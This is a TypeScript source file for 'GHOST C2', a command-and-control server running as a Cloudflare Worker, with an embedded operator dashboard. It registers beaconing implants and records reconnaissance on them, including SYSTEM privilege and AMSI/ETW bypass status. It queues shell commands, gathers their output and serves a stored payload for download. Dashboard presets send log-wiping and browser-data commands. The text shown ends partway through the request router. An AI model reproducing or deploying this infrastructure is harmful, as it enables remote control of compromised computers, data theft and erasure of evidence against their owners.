/**
 * GHOST C2 — Cloudflare Worker (KV‑backed, encrypted)
 *
 * - URL‑decodes session IDs (fixes pipe issue).
 * - Hostname‑derived AES‑GCM (no PSK).
 * - Results kept by default; ?clear=1 removes.
 * - KV operations retried with exponential backoff.
 * - Safe JSON parsing — never throws on malformed bodies.
 * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
 */

// ─── Environment ──────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  /** Seconds before an idle session expires. Default: 600. */
  SESSION_TIMEOUT_SECONDS: string;
  /** Allowed CORS origin. Default: * */
  CORS_ORIGIN: string;
}

// ─── Domain Types ─────────────────────────────────────────

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session?: string;
  enc?: string;          // encrypted JSON payload
}

interface ResultRequest {
  session?: string;
  enc?: string;          // encrypted output
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Constants ────────────────────────────────────────────

const MAX_SESSION_LEN = 128;
const MAX_CMD_LEN = 4096;
const MAX_OUTPUT_LEN = 65_536;
const RESULT_CAP = 500;
const RESULT_BYTE_CAP = 20 * 1024 * 1024; // 20 MB
const AUDIT_CAP = 1_000;
const AUDIT_TTL = 604_800; // 7 days
const TASK_TTL = 86_400;   // 24 hours
const PAYLOAD_MAX = 32 * 1024 * 1024; // 32 MB
const PAYLOAD_TTL = 86_400 * 30;

const KV_MAX_RETRIES = 3;
const KV_RETRY_BASE_MS = 200;

// ─── Crypto Helpers ───────────────────────────────────────

/**
 * Derive a 32‑byte AES key from the session ID using SHA‑256.
 * Both implant and Worker compute the same key from the same session ID.
 */
async function deriveKey(sid: string): Promise<Uint8Array> {
  const encoder = new TextEncoder();
  const data = encoder.encode(sid);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return new Uint8Array(hash);
}

async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
  if (data.length < 28) throw new Error("Ciphertext too short");
  const iv = data.slice(0, 12);
  const tag = data.slice(12, 28);
  const ct = data.slice(28);

  const ctWithTag = new Uint8Array(ct.length + tag.length);
  ctWithTag.set(ct, 0);
  ctWithTag.set(tag, ct.length);

  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
  return new TextDecoder().decode(decrypted);
}

async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));

  const buf = new Uint8Array(encrypted);
  const ct = buf.slice(0, buf.length - 16);
  const tag = buf.slice(buf.length - 16);

  const out = new Uint8Array(12 + 16 + ct.length);
  out.set(iv, 0);
  out.set(tag, 12);
  out.set(ct, 28);

  return btoa(String.fromCharCode(...out));
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const enc = new TextEncoder();
  const bufA = enc.encode(a);
  const bufB = enc.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) diff |= bufA[i] ^ bufB[i];
  return diff === 0;
}

function getClientIP(request: Request): string {
  return (
    request.headers.get("CF-Connecting-IP") ??
    request.headers.get("X-Real-IP") ??
    "unknown"
  );
}

function clamp(s: string, max: number): string {
  return s.length > max ? s.slice(0, max) : s;
}

function getSessionTTL(env: Env): number {
  const v = parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
  return Number.isFinite(v) && v > 0 ? v : 600;
}

function now(): string {
  return new Date().toISOString();
}

async function safeJson<T>(request: Request): Promise<T | null> {
  try {
    return (await request.json()) as T;
  } catch {
    return null;
  }
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const h = new Headers(response.headers);
  h.set("Access-Control-Allow-Origin", origin);
  h.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  h.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  h.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: h,
  });
}

// ─── KV: Retry Wrapper ────────────────────────────────────

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastErr: Error | undefined;
  for (let attempt = 0; attempt < KV_MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastErr = err as Error;
      if (attempt < KV_MAX_RETRIES - 1) {
        await new Promise(r => setTimeout(r, KV_RETRY_BASE_MS * (attempt + 1)));
      }
    }
  }
  throw lastErr ?? new Error("KV operation failed after retries");
}

// ─── KV: Session ──────────────────────────────────────────

function sessionKey(sid: string): string { return `session:${sid}`; }
function tasksKey(sid: string): string { return `tasks:${sid}`; }
function resultsKey(sid: string): string { return `results:${sid}`; }

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(sessionKey(sid));
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(
  kv: KVNamespace,
  sid: string,
  data: SessionData,
  ttl: number,
): Promise<void> {
  await withRetry(() =>
    kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: ttl }),
  );
}

// ─── KV: Tasks ────────────────────────────────────────────

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(tasksKey(sid));
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(
  kv: KVNamespace,
  sid: string,
  tasks: string[],
  sessionTtl = TASK_TTL,
): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(tasksKey(sid));
    } else {
      await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
    }
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Results ──────────────────────────────────────────

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(resultsKey(sid));
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(() => {
    if (results.length === 0) return kv.delete(resultsKey(sid));
    return kv.put(resultsKey(sid), JSON.stringify(results), { expirationTtl: TASK_TTL });
  });
}

async function appendResult(
  kv: KVNamespace,
  sid: string,
  entry: ResultEntry,
  sessionTtl: number,
): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);
    while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
      results.shift();
    }
    await putResults(kv, sid, results);
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const k of result.keys) keys.push(k.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const raw = await kv.get("audit_log");
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= AUDIT_CAP) log.splice(0, log.length - (AUDIT_CAP - 1));
    log.push(entry);
    await kv.put("audit_log", JSON.stringify(log), { expirationTtl: AUDIT_TTL });
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") ?? "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") ?? "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<BeaconRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ts = now();
  const ip = getClientIP(request);
  const ttl = getSessionTTL(env);

  // Derive AES key from session ID
  const keyBytes = await deriveKey(sid);

  let recon: Record<string, unknown> = {};
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      recon = parsed.recon ?? {};
    } catch (e) {
      console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    // Fallback for plaintext (if implant sends without encryption)
    recon = body.recon ?? {};
  }

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? ts,
    last_beacon: ts,
    recon: recon,
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  let cmd = "sleep";
  if (tasks.length > 0) {
    cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks, ttl);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
  } else {
    console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  }

  const plainResponse = JSON.stringify({ cmd });
  const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
  return jsonResponse({ enc: encryptedResponse });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<ResultRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ttl = getSessionTTL(env);
  const keyBytes = await deriveKey(sid);

  let output = "";
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      output = parsed.output ?? "";
    } catch (e) {
      console.error(`[result] sid=${sid} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    output = body.output ?? "";
  }

  const trimmed = clamp(output, MAX_OUTPUT_LEN);
  await appendResult(env.GHOST_KV, sid, { ts: now(), output: trimmed }, ttl);

  // If session doesn't exist, create it (shouldn't happen, but safe)
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const ts = now();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: ts,
      last_beacon: ts,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, ttl);
  }

  console.log(`[result] sid=${sid} len=${trimmed.length}`);
  return jsonResponse({ status: "ok" });
}

async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const ts = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;
    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((ts - new Date(data.last_beacon).getTime()) / 1000),
      recon: data.recon,
      pending_tasks: data.pending_tasks ?? 0,
      result_count: data.result_count ?? 0,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<TaskRequest>(request);
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const cmd = clamp(String(body.cmd), MAX_CMD_LEN);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  // sid is already decoded by router
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const results = await getResults(env.GHOST_KV, sid);
  const clear = new URL(request.url).searchParams.get("clear") === "1";
  if (clear) await putResults(env.GHOST_KV, sid, []);

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, clear },
  });

  return jsonResponse({ session: sid, results });
}

async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

async function handleAudit(request: Request, env: Env): Promise<Response> {
  const limit = Math.min(
    parseInt(new URL(request.url).searchParams.get("limit") ?? "100", 10),
    AUDIT_CAP,
  );
  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
  return jsonResponse({ entries: log.slice(-limit) });
}

function handleHealth(): Response {
  return jsonResponse({ status: "ok", ts: now() });
}

async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
  const body = await request.arrayBuffer();
  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
  if (body.byteLength > PAYLOAD_MAX) return errorResponse("Payload too large (max 32 MB)", 413);

  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: PAYLOAD_TTL });
  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "payload_uploaded",
    detail: { bytes: body.byteLength },
  });

  console.log(`[payload] uploaded ${body.byteLength} bytes`);
  return jsonResponse({ status: "ok", bytes: body.byteLength });
}

async function handleDownloadPayload(env: Env): Promise<Response> {
  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
  if (!raw) return errorResponse("Payload not found", 404);
  return new Response(raw, {
    status: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": String(raw.byteLength),
      "Cache-Control": "no-store",
    },
  });
}

// ─── Dashboard HTML ───────────────────────────────────────

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d0d0f;--panel:#16181d;--border:#2a2d35;--accent:#7c6af7;
  --accent2:#4fc3f7;--red:#ef4444;--green:#22c55e;--yellow:#eab308;
  --text:#e2e8f0;--muted:#64748b;--mono:'JetBrains Mono',monospace;
}
body{background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:13px;height:100vh;display:flex;flex-direction:column}
header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:16px}
header h1{font-size:15px;font-weight:700;letter-spacing:.05em;color:var(--accent)}
header h1 span{color:var(--text);opacity:.5}
#status-dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
#status-dot.live{background:var(--green);box-shadow:0 0 6px var(--green)}
#token-bar{margin-left:auto;display:flex;gap:8px;align-items:center}
#token-bar input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;border-radius:4px;font-family:inherit;font-size:12px;width:340px}
#token-bar input::placeholder{color:var(--muted)}
button{background:var(--accent);color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;transition:opacity .15s}
button:hover{opacity:.85}
button.danger{background:var(--red)}
button.ghost{background:transparent;border:1px solid var(--border);color:var(--muted)}
button.ghost:hover{border-color:var(--accent);color:var(--text)}
main{display:flex;flex:1;overflow:hidden}
#sidebar{width:260px;flex-shrink:0;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column}
#sidebar-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
#sidebar-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
#session-list{flex:1;overflow-y:auto}
.session-item{padding:10px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s}
.session-item:hover{background:#1e2028}
.session-item.active{background:#1e2028;border-left:2px solid var(--accent)}
.session-item .sid{color:var(--accent2);font-size:11px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.session-item .meta{color:var(--muted);font-size:10px;margin-top:3px}
.session-item .badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:10px;margin-top:4px}
.badge-tasks{background:#7c6af722;color:var(--accent)}
.badge-idle{background:#22c55e18;color:var(--green)}
.badge-stale{background:#ef444418;color:var(--red)}
#content{flex:1;display:flex;flex-direction:column;overflow:hidden}
#content-head{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap}
#selected-sid{font-weight:700;color:var(--accent2)}
#recon-bar{font-size:11px;color:var(--muted);flex:1}
#results-box{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px}
.result-entry{background:var(--panel);border:1px solid var(--border);border-radius:6px;overflow:hidden}
.result-ts{padding:5px 10px;background:#1e2028;color:var(--muted);font-size:10px;border-bottom:1px solid var(--border)}
.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.6;max-height:340px;overflow-y:auto;font-size:12px}
#cmd-bar{padding:12px 16px;border-top:1px solid var(--border);display:flex;gap:8px;background:var(--panel)}
#cmd-input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;font-family:inherit;font-size:13px}
#cmd-input::placeholder{color:var(--muted)}
#cmd-input:focus{outline:none;border-color:var(--accent)}
#no-session{flex:1;display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:14px}
#audit-panel{width:300px;flex-shrink:0;background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column}
#audit-panel-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
#audit-panel-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
#audit-list{flex:1;overflow-y:auto;padding:8px}
.audit-entry{padding:6px 8px;border-radius:4px;margin-bottom:4px;font-size:10px;border:1px solid var(--border)}
.audit-entry .atime{color:var(--muted);display:block;margin-bottom:2px}
.audit-entry .aact{color:var(--accent);font-weight:700}
.audit-entry .aip{color:var(--muted)}
#tabs{display:flex;border-bottom:1px solid var(--border)}
.tab{padding:8px 16px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);border-bottom:2px solid transparent;transition:all .15s}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
#toast{position:fixed;bottom:20px;right:20px;background:var(--panel);border:1px solid var(--border);padding:10px 16px;border-radius:6px;font-size:12px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:999}
#toast.show{opacity:1}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
</style>
</head>
<body>
<header>
  <div id="status-dot"></div>
  <h1>GHOST <span>C2</span></h1>
  <div id="token-bar">
    <input id="op-token" type="password" placeholder="Operator token (X-Operator-Token)">
    <button onclick="connect()">Connect</button>
  </div>
</header>
<main>
  <div id="sidebar">
    <div id="sidebar-head">
      <span>Sessions</span>
      <button class="ghost" onclick="refreshSessions()" style="padding:3px 8px;font-size:10px">↻</button>
    </div>
    <div id="session-list"><div style="padding:20px;color:var(--muted);font-size:11px">Not connected</div></div>
  </div>
  <div id="content">
    <div id="tabs">
      <div class="tab active" onclick="switchTab('results')">Output</div>
      <div class="tab" onclick="switchTab('recon')">Recon</div>
    </div>
    <div id="content-head" style="display:none">
      <span id="selected-sid"></span>
      <span id="recon-bar"></span>
      <button class="ghost" onclick="fetchResults()" style="padding:3px 8px;font-size:10px">↻</button>
      <button class="danger" style="padding:3px 8px;font-size:10px" onclick="killSession()">Kill</button>
    </div>
    <div id="no-session">← Select a session</div>
    <div id="results-box" style="display:none"></div>
    <div id="recon-box" style="display:none;flex:1;overflow-y:auto;padding:14px"></div>
    <div id="cmd-bar" style="display:none">
      <input id="cmd-input" placeholder="Command…" onkeydown="if(event.key==='Enter')sendCmd()">
      <button onclick="sendCmd()">Send</button>
      <button class="ghost" onclick="sendCmd('!wipe')">Wipe Logs</button>
      <button class="ghost" onclick="sendCmd('!browser')">Browsers</button>
      <button class="ghost" onclick="sendCmd('!ps ')">PS</button>
    </div>
  </div>
  <div id="audit-panel">
    <div id="audit-panel-head">
      <span>Audit</span>
      <button class="ghost" onclick="fetchAudit()" style="padding:3px 8px;font-size:10px">↻</button>
    </div>
    <div id="audit-list"><div style="padding:20px;color:var(--muted);font-size:11px">—</div></div>
  </div>
</main>
<div id="toast"></div>
<script>
let token = '';
let selectedSid = null;
let pollInterval = null;
let auditInterval = null;
let currentTab = 'results';

function toast(msg, dur=2500) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), dur);
}

function headers() {
  return { 'Content-Type': 'application/json', 'X-Operator-Token': token };
}

async function apiFetch(path, opts={}) {
  const r = await fetch(path, { headers: headers(), ...opts });
  if (r.status === 401) { toast('Invalid operator token'); return null; }
  return r;
}

async function connect() {
  token = document.getElementById('op-token').value.trim();
  if (!token) return toast('Enter operator token first');
  await refreshSessions();
  await fetchAudit();
  clearInterval(pollInterval);
  clearInterval(auditInterval);
  pollInterval = setInterval(async () => {
    await refreshSessions();
    if (selectedSid) await fetchResults();
  }, 5000);
  auditInterval = setInterval(fetchAudit, 15000);
  document.getElementById('status-dot').className = 'live';
  toast('Connected');
}

async function refreshSessions() {
  const r = await apiFetch('/sessions');
  if (!r) return;
  const sessions = await r.json();
  const list = document.getElementById('session-list');
  if (!sessions.length) { list.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px">No active sessions</div>'; return; }
  sessions.sort((a,b) => new Date(b.last_beacon) - new Date(a.last_beacon));
  list.innerHTML = sessions.map(s => {
    const idle = s.idle_seconds;
    const stale = idle > 180;
    const badgeCls = s.pending_tasks > 0 ? 'badge-tasks' : stale ? 'badge-stale' : 'badge-idle';
    const badgeTxt = s.pending_tasks > 0 ? s.pending_tasks + ' queued' : stale ? 'stale ' + fmt(idle) : 'live ' + fmt(idle);
    const active = s.session === selectedSid ? 'active' : '';
    return \`<div class="session-item \${active}" onclick="selectSession('\${esc(s.session)}')">
      <div class="sid">\${esc(s.session)}</div>
      <div class="meta">\${esc(s.remote_ip)} · \${esc(s.recon?.hostname||'?')} · \${esc(s.recon?.user||'?')}</div>
      <span class="badge \${badgeCls}">\${badgeTxt}</span>
    </div>\`;
  }).join('');
}

function fmt(secs) {
  if (secs < 60) return secs + 's';
  if (secs < 3600) return Math.floor(secs/60) + 'm';
  return Math.floor(secs/3600) + 'h';
}

function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

async function selectSession(sid) {
  selectedSid = sid;
  document.getElementById('selected-sid').textContent = sid;
  document.getElementById('content-head').style.display = 'flex';
  document.getElementById('no-session').style.display = 'none';
  document.getElementById('cmd-bar').style.display = 'flex';
  switchTab(currentTab);
  await refreshSessions();
  await fetchResults();
  await fetchRecon();
}

function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', (i===0&&tab==='results')||(i===1&&tab==='recon')));
  document.getElementById('results-box').style.display = tab === 'results' && selectedSid ? 'flex' : 'none';
  document.getElementById('results-box').style.flexDirection = 'column';
  document.getElementById('recon-box').style.display = tab === 'recon' && selectedSid ? 'block' : 'none';
}

async function fetchResults() {
  if (!selectedSid) return;
  const r = await apiFetch('/results/' + encodeURIComponent(selectedSid));
  if (!r) return;
  const data = await r.json();
  const box = document.getElementById('results-box');
  if (!data.results || !data.results.length) { box.innerHTML = '<div style="color:var(--muted);font-size:11px;padding:10px">No results yet</div>'; return; }
  box.innerHTML = data.results.slice().reverse().map(e =>
    \`<div class="result-entry"><div class="result-ts">\${esc(e.ts)}</div><div class="result-body">\${esc(e.output)}</div></div>\`
  ).join('');
}

async function fetchRecon() {
  if (!selectedSid) return;
  const r = await apiFetch('/sessions');
  if (!r) return;
  const sessions = await r.json();
  const s = sessions.find(x => x.session === selectedSid);
  if (!s) return;
  const recon = s.recon || {};
  const bar = [
    recon.hostname && \`<b>\${esc(recon.hostname)}</b>\`,
    recon.user && esc(recon.user),
    recon.elevated && '<span style="color:var(--red)">SYSTEM</span>',
    recon.build && 'build ' + recon.build,
    recon.amsi && '<span style="color:var(--green)">AMSI✓</span>',
    recon.etw  && '<span style="color:var(--green)">ETW✓</span>',
  ].filter(Boolean).join(' · ');
  document.getElementById('recon-bar').innerHTML = bar;
  document.getElementById('recon-box').innerHTML =
    '<pre style="color:var(--text);font-size:11px;line-height:1.8">' + esc(JSON.stringify(s, null, 2)) + '</pre>';
}

async function sendCmd(preset) {
  if (!selectedSid) return toast('No session selected');
  const input = document.getElementById('cmd-input');
  const cmd = preset || input.value.trim();
  if (!cmd) return;
  const r = await apiFetch('/task', {
    method: 'POST',
    body: JSON.stringify({ session: selectedSid, cmd })
  });
  if (!r) return;
  const data = await r.json();
  if (data.status === 'queued') {
    toast('Queued · depth=' + data.queue_depth);
    if (!preset) input.value = '';
  } else {
    toast('Error: ' + JSON.stringify(data));
  }
}

async function killSession() {
  if (!selectedSid || !confirm('Queue exit for ' + selectedSid + '?')) return;
  const r = await apiFetch('/sessions/' + encodeURIComponent(selectedSid), { method: 'DELETE' });
  if (!r) return;
  toast('Exit queued');
  selectedSid = null;
  document.getElementById('content-head').style.display = 'none';
  document.getElementById('no-session').style.display = 'flex';
  document.getElementById('results-box').style.display = 'none';
  document.getElementById('cmd-bar').style.display = 'none';
  await refreshSessions();
}

async function fetchAudit() {
  const r = await apiFetch('/audit?limit=50');
  if (!r) return;
  const data = await r.json();
  const list = document.getElementById('audit-list');
  if (!data.entries || !data.entries.length) { list.innerHTML = '<div style="padding:12px;color:var(--muted);font-size:11px">—</div>'; return; }
  list.innerHTML = data.entries.slice().reverse().map(e =>
    \`<div class="audit-entry"><span class="atime">\${esc(e.ts)}</span><span class="aact">\${esc(e.action)}</span> <span class="aip">\${esc(e.ip)}</span></div>\`
  ).join('');
}
</script>
</body>
</html>`;

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const { pathname: path } = url;
  const method = request.method;

  // CORS preflight
  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  // ── Web UI ────────────────────────────────────────────────
  if (path === "/" && method === "GET") {
    return new Response(DASHBOARD_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }

  // ── Public routes ──────────────────────────────────────
  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }
  if (path === "/ping" && method === "GET") {
    return withCORS(new Response("OK", { status: 200 }), env);
  }

  // ── Beacon routes (X-Beacon-Token) ────────────────────
  if (path === "/beacon" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }
  if (path === "/result" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }
